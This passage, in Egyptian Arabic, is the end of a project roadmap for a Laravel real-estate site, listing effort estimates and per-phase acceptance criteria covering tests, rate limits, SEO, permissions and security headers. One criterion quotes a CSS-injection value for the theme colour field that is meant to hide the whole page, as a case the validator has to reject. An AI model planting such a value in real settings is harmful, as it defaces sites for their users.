| Playwright E2E على المسارات الحرجة | CG-9 | 3–5 أيام |
| ضغط الميديا (7.4 MB فيديو + 1.7 MB صور في `public/`)، WebP/AVIF، `srcset`, `width/height` | §4.2, TD | 2–3 أيام |
| موديول `Reviews` + تكامل Google Places (المفتاح `google_place_id` موجود ومهمل) | §3 | 4–7 أيام |

---

**إجمالي الجهد للوصول لإطلاق إنتاجي مسؤول: 74–122 يوم عمل مطوّر.**
**الحد الأدنى لموقع قابل للإطلاق (المراحل 2 + 3 + السيو من 4): 44–70 يوم.**

---

## 9. معايير القبول (Definition of Done)

### DoD عام — ينطبق على كل مرحلة

- [ ] `php artisan test` بيعدّي بـ 0 فشل (النهارده: **1 فشل**).
- [ ] `npx tsc --noEmit` نضيف (النهارده: **نضيف ✅ — يجب الحفاظ عليه**).
- [ ] `./vendor/bin/pint --test` نضيف.
- [ ] `npm run build` بينجح، وحجم أكبر chunk **مش بيزيد** عن آخر قياس (خط الأساس: **496.18 kB / 156.11 kB gzip**).
- [ ] كل feature جديدة معاها Feature test واحد على الأقل.
- [ ] كل نص معروض للمستخدم **مش hardcoded** في `.tsx` (بعد المرحلة 4).
- [ ] `overlay/` متزامن مع `engine/` أو الملف موثّق كـ engine-only.
- [ ] الـ README محدَّث — **مفيش feature موصوفة ومش موجودة في الكود**.

### DoD المرحلة 2 — «تثبيت الأساس»

- [ ] `POST /admin/login` بيرجّع 429 بعد 5 محاولات فاشلة من نفس الـ IP خلال دقيقة.
- [ ] `POST /{locale}/leads` بيرجّع 429 بعد 5 طلبات خلال 10 دقايق، ورافض أي طلب بحقل الـ honeypot مليان.
- [ ] `AdminUserSeeder` **مش** بيحتوي أي كلمة مرور نصية في الكود، وإعادة تشغيله مبتغيّرش كلمة مرور مدير موجود.
- [ ] حفظ قيمة `primary = "red; } html{display:none}"` من شاشة الثيم **بيترفض بـ validation error** مش بيتحفظ.
- [ ] إرسال `location_id` غير موجود لـ `POST /admin/properties` بيرجّع 422 مش 500.
- [ ] أدمن يقدر يرفع صورة JPEG من `/admin/properties/create` وتظهر في الكارت في `/ar/properties` من غير أي كتابة مسار يدوي.
- [ ] `php artisan route:list` بيرجّع **صفر** راوتات بـ guard غير موجود (النهارده: **40**).
- [ ] `phpunit.xml` بيشغّل تستات الموديولات، وفيه ≥10 Feature tests بتغطي: login نجاح/فشل، حفظ إعداد + التأكد إن الكاش اتمسح، إنشاء ليد + رفض ليد غير صالح، CRUD كامل لريسورس واحد، وراوتنج اللغة.
- [ ] GitHub Actions workflow أخضر على `main`.

### DoD المرحلة 3 — «الموقع يبقى موقع»

- [ ] `GET /ar/properties?purpose=rent&location=القاهرة الجديدة&max_price=5000000` بيرجّع نتائج **مفلترة فعلًا من قاعدة البيانات**، والفلاتر ظاهرة في الـ URL وقابلة للمشاركة والرجوع بزرار الـ back.
- [ ] `properties` و `compounds` فيهم عمود `price_amount` رقمي + `slug` unique + index مركّب على `(is_active, purpose, location_id)`.
- [ ] الترتيب بالسعر (تصاعدي/تنازلي) شغال.
- [ ] `GET /ar/properties/{slug}` بيرجّع 200 بصفحة كاملة، و`GET /ar/properties/غير-موجود` بيرجّع 404.
- [ ] صفحة الليستنج مقسّمة صفحات (24 عنصر) وحجم الـ Inertia payload **ثابت** بغض النظر عن عدد العقارات في الجدول.
- [ ] كل CTA في `PropertyCard` و `CompoundCard` بيروح لصفحة تفاصيل حقيقية — **مفيش لينك بيرجّع لنفس الليستنج**.
- [ ] البندل مقسّم: chunk الموقع العام **مفهوش** أي كود من `Pages/Admin/*`.
- [ ] فورم البحث في `Home.tsx` إما اتشال أو بقى بيبعت `name` attributes حقيقية والنتيجة بتتفلتر.

### DoD المرحلة 4 — «السيو والمحتوى»

- [ ] كل صفحة عامة ليها `<title>` و `<meta description>` فريدين مصدرهم قاعدة البيانات (تحقق: `curl -s /ar/properties | grep -o '<title>.*</title>'` مختلف عن `/ar/about`).
- [ ] كل صفحة فيها `<link rel="canonical">` و `<link rel="alternate" hreflang="ar">` و `hreflang="en">` و `hreflang="x-default">`.
- [ ] صفحة العقار فيها JSON-LD صالح (يعدّي Google Rich Results Test).
- [ ] `/sitemap.xml` بيرجّع 200 وفيه كل العقارات والكمبوندات والمقالات المنشورة بالنسختين.
- [ ] `curl` على `/ar` بيرجّع HTML فيه المحتوى الفعلي مرندر (SSR شغال)، مش `<div id="app" data-page>` فاضية.
- [ ] `grep -rn 'ar ? "' resources/js` بيرجّع **صفر** نتائج — كل النصوص من ملفات lang.
- [ ] الأرقام في "من نحن" و"الرئيسية" كلها قابلة للتحرير من الداشبورد، وقيمها الافتراضية **فاضية** مش مخترعة.
- [ ] `grep -rn "4780\|46 فرد\|420 كمبوند\|1240" resources/js` = صفر.
- [ ] `App\Support\DemoContent` **متشال بالكامل** أو محصور خلف `if (app()->environment('local'))`.

### DoD المرحلة 5 — «التشغيل والجاهزية»

- [ ] مستخدم بدور `editor` بيسجّل دخول وبيوصل للداشبورد والمدونة فقط، وبياخد 403 على `/admin/users` — **مش 403 على كل حاجة**.
- [ ] جدول `permissions` فيه صفوف، وكل راوت أدمن محمي بـ `permission:` مش `role:admin`.
- [ ] عناصر المنيو في `AdminLayout` بتختفي حسب صلاحية المستخدم.
- [ ] وصول ليد جديد بيبعت إشعار للفريق خلال دقيقة.
- [ ] داشبورد الأدمن بيعرض ≥4 أرقام حقيقية من قاعدة البيانات، وقايمة "حالة البناء" الثابتة متشالت.
- [ ] كل عملية create/update/delete في الأدمن متسجّلة في activity log بالمستخدم والوقت.
- [ ] deploy على staging بـ MySQL و `APP_DEBUG=false` و`SESSION_SECURE_COOKIE=true` و HTTPS شغال.
- [ ] `curl -I https://staging/...` بيرجّع `Strict-Transport-Security` و `X-Frame-Options` و `Content-Security-Policy`.

### DoD المرحلة 6 — «التلميع»

- [ ] `hero_variant = webgl` بيشغّل الهيرو، و`= static` بيطفّيه — **من الداشبورد بدون build** (النهارده المفتاح مش مقروء خالص).
- [ ] الشادر بصريًا متعلّق بالعقارات (skyline / شبكة معمارية / مدينة)، مش بقع لونية عامة.
- [ ] `HeroWebGL` بيفحص `COMPILE_STATUS` و`LINK_STATUS` وبيرجع fallback نضيف عند الفشل.
- [ ] التنقل بين `/ar` و `/ar/about` و رجوع ×20 **مبيزوّدش** عدد الـ WebGL contexts (اختبار يدوي بـ DevTools).
- [ ] Lighthouse على `/ar` و`/ar/properties`: Performance ≥85، Accessibility ≥95، SEO = 100 (موبايل).
- [ ] `<h1>` واحد بالظبط في كل صفحة.
- [ ] axe-core بيرجّع 0 مخالفات critical/serious.
- [ ] Playwright بيغطي: بحث → ليستنج → تفاصيل → إرسال ليد → ظهور الليد في الأدمن. أخضر في CI.
- [ ] كل الصور بتتقدّم WebP/AVIF مع `srcset` و `width`/`height`؛ إجمالي وزن `/ar` أقل من 1.5 MB على أول تحميل.

---

*انتهى المستند. كل ادعاء فيه قابل للتحقق بفتح المسار ورقم السطر المذكور.*
